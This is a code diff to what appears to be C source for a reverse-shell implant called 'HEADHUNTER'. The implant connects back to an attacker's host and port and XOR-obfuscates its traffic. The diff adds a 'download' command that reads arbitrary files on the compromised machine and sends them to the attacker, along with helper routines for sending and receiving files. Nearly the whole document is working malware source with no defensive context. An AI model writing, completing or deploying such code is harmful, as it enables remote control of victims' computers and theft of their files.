@@ -10,12 +10,54 @@
 #include "payload_common.h"
 
 #define MAXBUF 65536
+#define SIZE 1024
 
 char* CLIENT_IP = LHOST;
 int CLIENT_PORT = PORT;
 char* key = KEY;
 char buf[MAXBUF];
 
+int sendfile(FILE* fp, int fd, char* key)
+{
+        char data[SIZE] = {0};
+        
+        while(fgets(data, SIZE, fp) != NULL) {
+                char* xordata = XOR(data, key, SIZE, strlen(key));
+                if (send(fd, xordata, sizeof(data), 0) == -1) {
+                        exit(1);
+                }
+                free(xordata);
+        }
+        char* eof = "--HEADHUNTER EOF--";
+        char* xoreof = XOR(eof, key, strlen(eof), strlen(key));
+        send(fd, xoreof, strlen(eof), 0);
+        free(xoreof);
+        return 0;
+}
+
+int recvfile(char* filename, int fd, char* key)
+{
+        int n;
+        FILE *fp;
+        char buffer[SIZE];
+        fp = fopen(filename, "w");
+        while(1){
+                n = recv(fd, buffer, SIZE, 0);
+                if (n <= 0){
+                        break;
+                        return 0;
+                }
+                char* xorbuffer = XOR(buffer, key, n, strlen(key));
+                if(strcmp(xorbuffer, "--HEADHUNTER EOF--") == 0){
+                        printf("[+] File successfully written to \"out.hunter\"\n");
+                        return 0;
+                }
+                fprintf(fp, "%s", xorbuffer);
+                free(xorbuffer);
+        }
+
+  return 0;
+}
 
 int main(void) {
 
@@ -82,7 +124,6 @@ int main(void) {
 			char path[2050];
                         char command[12000];
                         while (fgets(path, sizeof(path), fp) != NULL) {
-                       		printf("Line: %s\n", path);
 				strncat(command, path, strlen(path));
                         }
                         char* xordata = XOR(command, key, (int)strlen(command), keylen);
@@ -92,6 +133,39 @@ int main(void) {
 			memset(command, '\0', strlen(command));
 
 		}
+		
+		else if(str_starts_with(xorbuf, "download") == 0){
+                        
+                                char* cmd = split(xorbuf, " ");
+                                cmd[strlen(cmd)-1] = '\0'; // Remove newline
+                               
+                                FILE* fp = fopen(cmd, "r");
+                                if(fp == NULL){
+                                        
+                                        char* openerr = "[-] Error opening file\n";
+                                        char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
+                                        send(sock, xoropenerr, strlen(openerr), 0);
+                                        free(xoropenerr);
+                                        continue;
+
+                                }
+                                else{
+				
+                                        char* download = "--HUNTER DOWNLOAD--";
+                                        char* xordownload = XOR(download, key, strlen(download), keylen);
+                                        char confirm[5];
+                                        send(sock, xordownload, strlen(download), 0);
+                                        recv(sock, confirm, 5, 0);
+                                        char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
+                                        if(strcmp(xorconfirm, "OK") == 0){
+                                                sendfile(fp, sock, key);
+                                        }
+                                        else{
+                                                continue;
+                                        }
+				}
+                        
+                }
 
 		else if(strncmp(xorbuf, "\n", 1) == 0)
                 {
